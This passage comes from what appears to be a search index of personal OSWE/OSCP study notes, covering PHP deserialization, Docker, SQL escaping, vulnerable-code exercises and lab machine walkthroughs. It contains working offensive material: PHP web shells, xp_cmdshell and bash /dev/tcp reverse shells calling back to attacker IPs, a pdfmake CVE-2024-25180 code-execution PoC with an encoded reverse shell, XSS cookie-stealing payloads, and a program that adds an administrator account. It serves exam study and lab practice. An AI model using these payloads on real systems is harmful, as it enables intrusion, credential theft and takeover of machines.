80, but need credential</p> <p></p> <p>Use <code>GETS</code> method</p> <p></p> <p></p> <p><code>scriptz/php.js</code> contains a <code>serialize()</code> function</p> <p></p> <p>log.php.BAK</p> <pre><code>&lt;?php\nclass Log\n{\n    public $filename = '';\n    public $data = '';\n\n    public function __construct()\n    {\n        $this-&gt;filename = '';\n    $this-&gt;data = '';\n    }\n\n    public function PrintLog()\n    {\n        $pre = \"[LOG]\";\n    $now = date('Y-m-d H:i:s');\n\n        $str = '$pre - $now - $this-&gt;data';\n        eval(\"\\$str = \\\"$str\\\";\");\n        echo $str;\n    }\n\n    public function __destruct()\n    {\n    file_put_contents($this-&gt;filename, $this-&gt;data, FILE_APPEND);\n    }\n}\n?&gt;\n</code></pre> <pre><code>&lt;script&gt;\nfunction submit_form() {\nvar object = serialize({id: 1, firstname: 'Rene', surname: 'Margitte', artwork: 'The Treachery of Images'}); \nobject = object.substr(object.indexOf(\"{\"),object.length);\nobject = \"O:4:\\\"Info\\\":4:\" + object;\ndocument.forms[0].param.value = object;\ndocument.getElementById('info_form').submit();\n}\n&lt;/script&gt;\n</code></pre> <pre><code>serialize({id: 1, firstname: 'Rene', surname: 'Margitte', artwork: 'The Treachery of Images'}); \n\na:4:{s:2:\"id\";i:1;s:9:\"firstname\";s:4:\"Rene\";s:7:\"surname\";s:8:\"Margitte\";s:7:\"artwork\";s:23:\"The Treachery of Images\";}\n\nO:4:\"Info\":4:{s:2:\"id\";i:1;s:9:\"firstname\";s:4:\"Rene\";s:7:\"surname\";s:8:\"Margitte\";s:7:\"artwork\";s:23:\"The Treachery of Images\";}\n\nserialize({filename:'/var/www/html/scriptz/hi.txt', data:'TheTreacheryofImages'})\n\n'a:2:{s:8:\"filename\";s:28:\"/var/www/html/scriptz/my.txt\";s:4:\"data\";s:13:\"what the hell\";}'\n\nO:3:\"Log\":2:{s:8:\"filename\";s:28:\"/var/www/html/scriptz/hi.txt\";s:4:\"data\";s:20:\"TheTreacheryofImages\";}\n\nO:3:\"Log\":2:{s:8:\"filename\";s:30:\"/var/www/html/scriptz/Meh1.txt\";s:4:\"data\";s:12:\"HighOnCoffee\";}\n</code></pre> <p></p>"}, {"location": "OSWE/Pre-request/Docker%20commands/", "title": "Common commands of Docker", "text": ""}, {"location": "OSWE/Pre-request/Docker%20commands/#install-docker-on-kali", "title": "Install Docker on Kali", "text": "<pre><code>$ echo \"deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\" | \\\n  sudo tee /etc/apt/sources.list.d/docker.list \n\n$ curl -fsSL https://download.docker.com/linux/debian/gpg |\n  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\n\n$ sudo apt update\n$ sudo apt install -y docker-ce docker-ce-cli containerd.io\n</code></pre> <pre><code>sudo docker rm -f &lt;container name&gt;\n\n# remove all stopped containers\nsudo docker container prune\n\n# list all containers\nsudo docker ps -a\n\n# stop a running container\nsudo docker stop &lt;container name&gt;\n\n# to see port mapping of a specific container\ndocker port &lt;container_id_or_name&gt;\n\n# to see the processes running inside a container\ndocker top &lt;container_id_or_name&gt;\n\n# view resource usage of containers\ndocker stats\n\n# view logs of a container\ndocker logs &lt;container_id_or_name&gt;\n\n# view detail information of a container\ndocker inspect &lt;container_id_or_name&gt;\n\n# view images\ndocker images\n\n# remove a image\ndocker rmi &lt;IMAGE_ID_OR_NAME&gt;\n\n# remove all unused images\ndocker image prune\n\n# run docker image\n$ sudo docker run -d -p 8080:80 --name &lt;container name&gt; &lt;image name&gt;\n\n# usinf commandline in container\nsudo docker exec -it &lt;container_name&gt; /bin/bash\n\n# Remove unused networks\nsudo docker network prune\n</code></pre>"}, {"location": "OSWE/Pre-request/RegEx/", "title": "Regular Expression", "text": "<p>Learn Regex in a easy way</p> <p>Practice:</p> <ul> <li>Regex Golf</li> <li>regexcrossword.com</li> <li>regex101.com</li> </ul>"}, {"location": "OSWE/Pre-request/RegEx/#quick-notes", "title": "Quick Notes", "text": "<pre><code>MetaCharacters (Need to be escaped):\n.[{()\\^|?*+\n\n\nFor Example:\n. - select everything\n\\. - matches literal dot\n\n- You have to escape \\ with \\ i.e. \\\\\n\nMatches characters\n.  - Any Character Except New Line\n\\d - Digit (0-9)\n\\D - Not a Digit (0-9)\n\\w - Word Character (a-z, A-Z, 0-9, _)\n\\W - Not a Word character\n\\s - Whitespace (space, tab, newline)\n\\S - Not Whitespace (space, tab, newline)\n\nAnchors - matches visible positions between characters\n\\b - Word Boundary\n\\B - Not a Word Boundary\n^  - Beginning of a String\n$  - End of a String\n\n[]   - Matches Characters in brackets\n[^ ] - Matches Characters NOT in bracket\n|    - Either Or\n( )  - Group\n\nQuantifiers:\n*      - 0 or More\n+      - 1 or More\n?      - 0 or One\n{3}    - Exact Number\n{3, 4} - Range of Numbers (Minimum, Maximum)\n</code></pre>"}, {"location": "OSWE/Pre-request/RestTimezone/", "title": "Reset Timezone", "text": "<pre><code>$ timedatectl\n\n# list available timezone\n$ timedatectl list-timezones\n# Set the Timezone to GMT (UTC)\n$ sudo timedatectl set-timezone Etc/UTC\n\n# Set the hardware clock (RTC) to match the system time\nsudo hwclock --systohc\n\n# Enable and start the systemd-timesyncd service\nsudo timedatectl set-ntp true\nsudo systemctl enable systemd-timesyncd\nsudo systemctl start systemd-timesyncd\n</code></pre>"}, {"location": "OSWE/Pre-request/apache2/", "title": "apache2", "text": "<p>Define which ports are listening Web requests:</p> <p><code>/etc/apache2/ports.conf</code></p> <pre><code># If you just change the port or add more ports here, you will likely also\n# have to change the VirtualHost statement in\n# /etc/apache2/sites-enabled/000-default.conf\n\nListen 80\n\n&lt;IfModule ssl_module&gt;\n        Listen 443\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_gnutls.c&gt;\n        Listen 443\n&lt;/IfModule&gt;\n</code></pre> <pre><code>$ sudo tail -f /var/log/apache2/access.log\n\n</code></pre>"}, {"location": "OSWE/Pre-request/php/", "title": "PHP relevant", "text": ""}, {"location": "OSWE/Pre-request/php/#file-upload", "title": "File upload", "text": "<p>MIME stands for Multipuporse Internet Mail Extensions.</p> <p><code>Content-Type: application/x-php</code></p> <pre><code>&lt;?=`$_GET[x]`?&gt;\n\n\n&lt;?system($_GET[0]);\n\n&lt;?php echo shell_exec($_GET['cmd']);?&gt;\n</code></pre> <p>Methods of uploading shells to the Web APP</p> <p>File upload restriction bypass</p>"}, {"location": "OSWE/Pre-request/php/#unpopular-php-extensions", "title": "Unpopular PHP extensions", "text": "<pre><code>pht, phpt, phtml, php3,php4,php5,php6, phar\n</code></pre>"}, {"location": "OSWE/Pre-request/php/#var_dump", "title": "var_dump()", "text": "<p>The <code>var_dump()</code> function in PHP is a debugging tool that displays structured information about one or more variables, including its type and value.</p> <pre><code>var_dump(mixed $value, mixed ...$values): void\n</code></pre>"}, {"location": "OSWE/Tips/ExamTips/", "title": "Exam Tips", "text": ""}, {"location": "OSWE/Tips/ExamTips/#turn-on-database-log", "title": "Turn on database log", "text": "<p>Turn on database log to find potential sql injection point.</p> <pre><code>sudo nano /etc/mysql/my.cnf\n\n[mysqld]\n...\ngeneral_log_file        = /var/log/mysql/mysql.log\ngeneral_log             = 1\n\nsudo systemctl restart mysql\n\nsudo tail -f /var/log/mysql/mysql.log\n</code></pre>"}, {"location": "OSWE/Tips/ExamTips/#deserialization", "title": "Deserialization", "text": "<p>https://hacktricks.boitatech.com.br/pentesting-web/deserialization</p> <p>.Net deserialization </p> <p>ysoserial.net</p> <p>magic chars for .Net serialization: something starts like AAEAAAD</p> <p>Jave deserialization</p> <p>ysoserial java</p> <p>Python deserialization</p> <p>pay attention to pickle, json pickle libraries</p>"}, {"location": "OSWE/Tips/ExamTips/#run-net-project-in-linux", "title": "Run .Net project in Linux", "text": "<ol> <li>Create a new console project:</li> </ol> <pre><code>dotnet new console -o MyApp\ncd MyApp\n</code></pre> <ol> <li> <p>Replace the default Program.cs with your code file</p> </li> <li> <p>Run the application:</p> </li> </ol> <pre><code>dotnet run\n</code></pre>"}, {"location": "OSWE/Tips/FileTransfer/", "title": "File transfer", "text": ""}, {"location": "OSWE/Tips/FileTransfer/#smb", "title": "SMB", "text": "<pre><code># on Kali (Server)\n$ sudo impacket-smbserver test .\n\n# on Windows (Client)\nNavigated to  \\\\kali-machine-ip\\test by using Windows Explorer\n\n# OR \nC:\\&gt;net use\nC:\\&gt;net use \\\\[host]\\[share name]\nC:\\&gt;net use /d \\\\[host]\\[share name]\ncopy \\\\10.11.0.XXX\\smb\\ms11-046.exe \\windows\\temp\\a.exe\n</code></pre> <p>To Get Shell From RCE</p> <p>In a different case, I only had access to a MySQL database, and wanted to get a full shell. I used <code>xp_cmdshell</code> to map my drive, copy nc to the host, and run it:</p> <pre><code>1&gt; xp_cmdshell 'net use \\\\10.11.0.XXX\\smb'\n2&gt; go\n        output\n\n        The command completed successfully.\n        NULL\n        NULL\n(return status = 0)\n\n1&gt; xp_cmdshell 'copy \\\\10.11.0.XXX\\smb\\nc.exe \\windows\\temp\\nc.exe'\n2&gt; go\n        output\n\n                1 file(s) copied.\n                NULL\n(return status = 0)\n\n1&gt; xp_cmdshell '\\windows\\temp\\nc.exe -e cmd.exe 10.11.0.XXX 443'\n2&gt; go\n</code></pre>"}, {"location": "OSWE/Tips/FileTransfer/#python-flask", "title": "Python Flask", "text": "<p>filetransfer.py</p> <pre><code>filetransfer.py\nfrom flask import Flask, request \napp = Flask(__name__) \n@app.route('/upload', methods=['POST']) \ndef upload_file(): \n    if 'file' not in request.files: \n        return 'No file part' \n    file = request.files['file'] \n    if file.filename == '': \n        return 'No selected file' \n    file.save(file.filename) \n    return 'File uploaded successfully'\nif __name__ == '__main__': \n    app.run(host='0.0.0.0', port=8081)\n</code></pre> <p>Server:</p> <p><code>python filetransfer.py</code></p> <p>Client:</p> <pre><code>$ cmd /c curl -F \"file=@&lt;file_name&gt;\" http://10.10.128.XXX:8081/upload \n</code></pre>"}, {"location": "OSWE/Tips/FileTransfer/#here-is-a-one-liner-bash-to-transfer-files", "title": "Here is a one-liner bash to transfer files", "text": "<p><code>bash -c \"exec 3&lt;&gt;/dev/tcp/IP/80; echo -e 'GET /youfile.sh HTTP/1.1\\r\\nHost: ip\\r\\nConnection: close\\r\\n\\r\\n' &gt;&amp;3; cat &lt;&amp;3 &gt; yourfile.sh\"</code></p> <p>When working in containers, you\u2019re operating in a highly stripped-down environment. Typically, you won\u2019t have access to common offensive security tools like or even some basic utilities like nc, wget, curl. </p>"}, {"location": "OSWE/Tips/MySQL/", "title": "MySQL", "text": ""}, {"location": "OSWE/Tips/MySQL/#quote-escaping", "title": "Quote escaping", "text": "<ol> <li>Escaping Single Quotes (<code>'</code>)</li> </ol> <p>In MySQL, single quotes are used to denote string literals. If your string contains a single quote, you need to escape it by doubling it (<code>''</code>).</p> <pre><code>INSERT INTO users (username) VALUES ('O''Reilly');\n</code></pre> <ol> <li>Escaping Double Quotes (<code>\"</code>)</li> </ol> <p>Double quotes are not typically used for string literals in MySQL (unless the <code>ANSI_QUOTES</code> SQL mode is enabled). If you need to include a double quote in a string, you can escape it by doubling it (<code>\"\"</code>).</p> <pre><code>-- No special escaping is needed unless ANSI_QUOTES is enabled\nINSERT INTO products (description) VALUES ('5\" display');\n</code></pre> <ol> <li>Using Backslashes () for Special Characters MySQL recognizes certain escape sequences for special characters. For example:</li> </ol> <p><code>\\0</code> - ASCII NUL (0x00)</p> <p><code>\\'</code> - Single quote</p> <p><code>\\\"</code> - Double quote</p> <p><code>\\b</code> - Backspace</p> <p><code>\\n</code> - Newline</p> <p><code>\\r</code> - Carriage return</p> <p><code>\\t</code> - Tab</p> <p><code>\\\\</code> - Backslash</p> <p><code>\\%</code> - Percent sign (used in LIKE clauses)</p> <p><code>\\_</code> - Underscore (used in LIKE clauses)</p> <ol> <li>Using Prepared Statements (Best Practice) Instead of manually escaping quotes and special characters, use prepared statements with parameterized queries. This approach is safer and prevents SQL injection.</li> </ol> <pre><code>$stmt = $mysqli-&gt;prepare(\"INSERT INTO users (username, email) VALUES (?, ?)\");\n$stmt-&gt;bind_param(\"ss\", $username, $email);\n$username = \"O'Reilly\";\n$email = \"oreilly@example.com\";\n$stmt-&gt;execute();\n</code></pre> <pre><code>import mysql.connector\n\ndb = mysql.connector.connect(\n    host=\"localhost\",\n    user=\"root\",\n    password=\"password\",\n    database=\"testdb\"\n)\ncursor = db.cursor()\nquery = \"INSERT INTO users (username, email) VALUES (%s, %s)\"\nvalues = (\"O'Reilly\", \"oreilly@example.com\")\ncursor.execute(query, values)\ndb.commit()\n</code></pre> <ol> <li>Using <code>QUOTE()</code> Function</li> </ol> <p>MySQL provides a <code>QUOTE()</code> function that automatically escapes a string and wraps it in single quotes.</p> <pre><code>SELECT QUOTE('O\\'Reilly');\n</code></pre>"}, {"location": "OSWE/Tips/PostgreSQL/", "title": "PostgreSQL", "text": "<pre><code>$ psql -p &lt;port&gt; -U &lt;user&gt; -d &lt;DBName&gt;\n</code></pre> <pre><code>select ascii('w'), ascii('0'), ascii('0'), ascii('t');\n\nselect chr(119), chr(48), chr(48), chr(116);\n\nselect chr(119) || chr(48) || chr(48) || chr(116);\n</code></pre> <pre><code>\\?               # Show help for psql commands\n\\h               # Show SQL command help\n\\q               # Quit psql\n\\l               # List all databases\n\\c dbname        # Connect to another database\n\\dt              # List tables in current database\n\\d table_name    # Describe a table structure\n\\du              # List users and roles\n\\dn              # List schemas\n\\e               # Open editor to edit query\n\\i filename      # Execute SQL from file\n\\o filename      # Send query results to file\n\\conninfo        # Show current connection info\n\\timing          # Toggle query timing\n\\x               # Toggle expanded output\n</code></pre>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/BrokenAuth/", "title": "BrokenAuth", "text": "<p>https://github.com/yeswehack/vulnerable-code-snippets</p> <pre><code>$ sudo docker compose up --build\n# OR\n$ sudo docker-compose up --build\n</code></pre>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/BrokenAuth/#broken-auth-spoof", "title": "broken-auth-spoof", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/BrokenAuth/#resolution", "title": "Resolution", "text": "<pre><code>Cookie: role=admin\n</code></pre>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/BusinessLogic/", "title": "BusinessLogic", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/BusinessLogic/#business-logic-money-transfer", "title": "business-logic-money-transfer", "text": "<p>It doesn't check the negative amount.</p>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CORS/", "title": "CORS", "text": "<p>Cross-Origin Resource Sharing (CORS) standard enables servers to define who can access their assets and which HTTP request methods are permitted from external sources.</p>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CORS/#cors-classic", "title": "cors-classic", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CSRF/", "title": "CSRF", "text": "<p>Cross-Site Request Forgery (CSRF) is a type of security vulnerability found in web applications. It enables attackers to perform actions on behalf of unsuspecting users by exploiting their authenticated sessions. The attack is executed when a user, who is logged into a victim's platform, visits a malicious site. This site then triggers requests to the victim's account through methods like executing JavaScript, submitting forms, or fetching images.</p>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CSRF/#csrf-change-email", "title": "csrf-change-email", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CachePoisoning/", "title": "CachePoisoning", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CachePoisoning/#27-cache-poisoning-classicpy", "title": "27-cache-poisoning-classic.py", "text": "<p>Primary Vulnerability: Cache Poisoning via Referer Header</p> <p>Root Cause:</p> <p>The application caches responses that include the Referer header (user-controlled input) without proper sanitization</p> <p>The cache key doesn't differentiate between different Referer headers, allowing poisoning</p> <p>Exploitation Scenario:</p> <ol> <li> <p>An attacker can send a request with a malicious Referer header</p> </li> <li> <p>The server caches this response with the malicious content</p> </li> <li> <p>Subsequent users receive the poisoned cached response</p> </li> </ol> <p>Impact:</p> <ol> <li> <p>Stored XSS (if HTML/JS is injected via Referer)</p> </li> <li> <p>Defacement of the cached page</p> </li> <li> <p>Potential session hijacking if sensitive data is included</p> </li> <li> <p>Information disclosure (showing other users' Referer headers)</p> </li> </ol> <pre><code>$ curl -H \"Referer: &lt;script&gt;fetch('http://localhost/steal?cookie='+document.cookie)&lt;/script&gt;\" http://127.0.0.1:1337\n\n# trigger the exploit\n$ curl 127.0.0.1:1337\n</code></pre> <p></p> <p></p>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CodeInjection/", "title": "CodeInjection", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CodeInjection/#code-injection-file-write", "title": "code-injection-file-write", "text": "<pre><code># Doesn't work\n&lt;?php phpinfo(); ?&gt;\n\n# works\n&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;script&gt;fetch(\"http://127.0.0.1/notexist?cookie=\"+document.cookie)&lt;/script&gt;\n</code></pre>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CommandInjection/", "title": "CommandInjection", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CommandInjection/#command-injection-classic", "title": "command-injection-classic", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CommandInjection/#command-injection-escapeshellcmd", "title": "command-injection-escapeshellcmd", "text": "<pre><code>&lt;?php\n// This looks like a code block but will be preserved in PHP output\nsystem($_GET['cmd']);\n?&gt;\n</code></pre> <p><code>http://vulnerable-server.com/files/converted?cmd=id</code></p>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/CommandInjection/#command-injection-saint_patrick", "title": "command-injection-saint_patrick", "text": "<p>The code uses <code>escapeshellcmd()</code> to sanitize the output format parameter, but this is insufficient protection against command injection in this context.</p> <p>The PHP function <code>escapeshellcmd()</code>:</p> <p>Escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands</p> <p>Escapes these characters: <code>#&amp;;</code> <code>|*?~&lt;&gt;^()[]{}$</code>, <code>\\x0A</code> and <code>\\xFF</code></p> <p>Does not escape spaces</p> <pre><code>escapeshellcmd('php;id') \u2192 returns 'php\\;id'\n\nPOST item=beer;id;echo\n\ncd /tmp/uniqid123; tar -cf /tmp/timestamp_beer;id;echo.gz .\n\ncurl -X POST http://127.0.0.1:1337/ \\\n  -d \"item=beer;bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1';echo\"\n</code></pre>"}, {"location": "OSWE/Vulnerable%20Code%20Snippets/Deserialization/", "title": "Deserialization", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/Deserialization/#deserialization-classic", "title": "deserialization-classic", "text": ""}, {"location": "OSWE/Vulnerable%20Code%20Snippets/Deserialization/#deserialization-wakeup", "title": "deserialization-wakeup", "text": ""}, {"location": "OffSec%20playground/CVE-2024-25180/", "title": "CVE-2024-25180", "text": "<p>Nov 07, 2024</p>"}, {"location": "OffSec%20playground/CVE-2024-25180/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 192.168.208.42 -p- -Pn -sCV --min-rate=1000\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)\n|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)\n|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)\n1234/tcp open  http    Node.js Express framework\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n</code></pre>"}, {"location": "OffSec%20playground/CVE-2024-25180/#port-1234-pdfmake", "title": "Port 1234 PDFMake", "text": "<p>http://192.168.208.42:1234/</p> <p></p> <pre><code>// playground requires you to assign document definition to a variable called dd\n\nvar dd = {\n    content: [\n        'First paragraph',\n        'Another paragraph, this time a little bit longer to make sure, this line will be divided into at least two lines'\n    ]\n\n}\n</code></pre> <p>Arbitrary Code Injection in pdfmake</p> <p>Overview</p> <p>pdfmake is a Client/server side PDF printing in pure JavaScript</p> <p>Affected versions of this package are vulnerable to Arbitrary Code Injection via a crafted POST request to the /pdf path. An attacker can execute arbitrary code on the system by sending a specially crafted request.</p> <p>PoC</p> <pre><code>import requests\n\ndata = {\n    \"content\": \"this.process.mainModule.require('child_process').execSync('&lt;COMMAND&gt;').toString(); const dd = 2\"\n}\n\nresp = requests.post(\"http://ip:port/pdf\", data=data)\nprint(resp.text)\n</code></pre> <p>Use BurpSuite</p> <pre><code>POST /pdf HTTP/1.1\nHost: 192.168.208.42:1234\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/json;charset=utf-8\nContent-Length: 106\nOrigin: http://192.168.208.42:1234\nConnection: close\nReferer: http://192.168.208.42:1234/\n\n{\"content\":\"this.process.mainModule.require('child_process').execSync('whoami').toString(); const dd = 2\"}\n</code></pre> <p></p> <p>Got an TypeError which confirms that we have code exection</p> <pre><code>$ echo 'bash -i &gt;&amp; /dev/tcp/192.168.45.179/8888 0&gt;&amp;1' | base64                  \nYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3OS84ODg4IDA+JjEK\n\n\n{\"content\":\"this.process.mainModule.require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3OS84ODg4IDA+JjEK | base64 -d | bash').toString(); const dd = 2\"}\n\n$ nc -nvlp 8888\n</code></pre> <p></p>"}, {"location": "OffSec%20playground/Hepet/", "title": "Hepet", "text": "<p>May 26, 2021</p> <p>Intermediate</p> <p>Macro exploit</p>"}, {"location": "OffSec%20playground/Hepet/#port-scan", "title": "Port scan", "text": "<pre><code>$ ports=$(nmap 192.168.208.140 -p- --min-rate=1000 -T4 | grep -E '[0-9]\\/tcp' | awk -F '/' '{print $1}' | tr '\\n' ',')\n\n$ echo $ports\n25,79,105,106,110,135,139,143,443,445,2224,5040,7680,8000,11100,20001,33006,49664,49665,49666,49667,49668,49669,\n\n$ nmap 192.168.208.140 -sCV -p $ports\nPORT      STATE SERVICE        VERSION\n25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)\n|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME\n79/tcp    open  finger         Mercury/32 fingerd\n| finger: Login: Admin         Name: Mail System Administrator\\x0D\n| \\x0D\n|_[No profile information]\\x0D\n105/tcp   open  ph-addressbook Mercury/32 PH addressbook server\n106/tcp   open  pop3pw         Mercury/32 poppass service\n110/tcp   open  pop3           Mercury/32 pop3d\n|_pop3-capabilities: EXPIRE(NEVER) APOP USER TOP UIDL\n135/tcp   open  msrpc          Microsoft Windows RPC\n139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn\n143/tcp   open  imap           Mercury/32 imapd 4.62\n|_imap-capabilities: AUTH=PLAIN OK IMAP4rev1 CAPABILITY complete X-MERCURY-1A0001\n443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n|_http-title: 400 Bad Request\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23\n| http-methods: \n|_  Potentially risky methods: TRACE\n| tls-alpn: \n|_  http/1.1\n445/tcp   open  microsoft-ds?\n2224/tcp  open  http           Mercury/32 httpd\n|_http-title: Mercury HTTP Services\n5040/tcp  open  unknown\n7680/tcp  open  pando-pub?\n8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: Time Travel Company Page\n11100/tcp open  vnc            VNC (protocol 3.8)\n| vnc-info: \n|   Protocol version: 3.8\n|   Security types: \n|_    Unknown security type (40)\n20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc\n| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig\n| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore\n| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js\n| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore\n| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js\n| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project\n| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build\n| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config\n| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html\n| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json\n| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json\n| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md\n| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src\n| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static\n|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects\n| ftp-syst: \n|_  SYST: UNIX emulated by FileZilla\n|_ftp-bounce: bounce working!\n33006/tcp open  unknown\n| fingerprint-strings: \n|   DNSStatusRequestTCP, GetRequest, HTTPOptions, Help, LANDesk-RC, LDAPBindReq, NCP, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, giop: \n|_    Host '192.168.45.179' is not allowed to connect to this MariaDB server\n49664/tcp open  msrpc          Microsoft Windows RPC\n49665/tcp open  msrpc          Microsoft Windows RPC\n49666/tcp open  msrpc          Microsoft Windows RPC\n49667/tcp open  msrpc          Microsoft Windows RPC\n49668/tcp open  msrpc          Microsoft Windows RPC\n49669/tcp open  msrpc          Microsoft Windows RPC\n</code></pre> <p>Check SMB anonymous login, no luck</p> <pre><code>$ smbmap -H 192.168.208.140 -u 'anonymous' -p 'anonymous'\n$ smbmap -H 192.168.208.140 -u '' -p ''\n</code></pre>"}, {"location": "OffSec%20playground/Hepet/#port-79-finger", "title": "Port 79 finger", "text": "<p>pentestmonkey / finger-user-enum</p> <pre><code>$ ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.208.140 | grep -v 'is not known'\n\nadmin@192.168.208.140: Login: admin         Name: Mail System Administrator..\nagnes@192.168.208.140: Login: agnes         Name: Agnes....[No profile information]..\ncharlotte@192.168.208.140: Login: charlotte         Name: Charlotte....[No profile information]..\njonas@192.168.208.140: Login: jonas         Name: Jonas....[No profile information]..\nmagnus@192.168.208.140: Login: magnus         Name: Magnus....[No profile information]..\nmartha@192.168.208.140: Login: martha         Name: Martha....[No profile information]..\n</code></pre> <p></p>"}, {"location": "OffSec%20playground/OSCPExamTips/", "title": "OSCPExamTips", "text": ""}, {"location": "OffSec%20playground/OSCPExamTips/#ssh-connection", "title": "SSH connection", "text": "<pre><code>ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" learner@192.168.50.52\n</code></pre> <p>The <code>UserKnownHostsFile=/dev/null</code> and <code>StrictHostKeyChecking=no</code> options have been added to prevent the known-hosts file on our local Kali machine from being corrupted.</p> <p>From a security perspective, this is not best practice. The reason we use these options is to eliminate our known-hosts file from identifying mismatched machine info when we revert lab machines. Using the <code>UserKnownHostsFile=/dev/null</code> option prevents the server host key from being recorded. This means that every time we connect, it will be treated like a new connection. By using the <code>StrictHostKeyChecking=no</code> option, we are telling SSH not to verify the authenticity of the server host key.</p> <p>In the real world, using either (or both) of these options would open us up to man-in-the-middle attacks. We use it here to make the student's learning experience smoother.</p>"}, {"location": "OffSec%20playground/OSCPExamTips/#adduserexe", "title": "adduser.exe", "text": "<pre><code>#include &lt;stdlib.h&gt;\n\nint main ()\n{\n  int i;\n\n  i = system (\"net user dave2 password123! /add\");\n  i = system (\"net localgroup administrators dave2 /add\");\n\n  return 0;\n}\n</code></pre> <pre><code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n</code></pre>"}, {"location": "OffSec%20playground/OSCPExamTips/#list-of-services-with-spaces-and-missing-quotes-in-the-binary-path", "title": "List of services with spaces and missing quotes in the binary path", "text": "<pre><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName\n\nwmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n</code></pre> <p>ReynhSurveillance                         Stopped C:\\Enterprise Software\\Monitoring Solution\\Surveillance Apps\\ReynhSurveillance.exe</p>"}, {"location": "OffSec%20playground/OSCPExamTips/#1623-unquoted-service-paths", "title": "16.2.3. Unquoted Service Paths", "text": "<p>Q2:</p> <p>Only <code>Surveillance.exe</code> works</p> <pre><code>copy adduser.exe \"C:\\Enterprise Software\\Monitoring Solution\\Surveillance.exe\"\n</code></pre>"}, {"location": "OffSec%20playground/OSCPExamTips/#1632", "title": "16.3.2", "text": "<p>Q3: DLL hijacking</p> <pre><code>#include &lt;stdlib.h&gt;\n#include &lt;windows.h&gt;\n\nBOOL APIENTRY DllMain(\nHANDLE hModule,// Handle 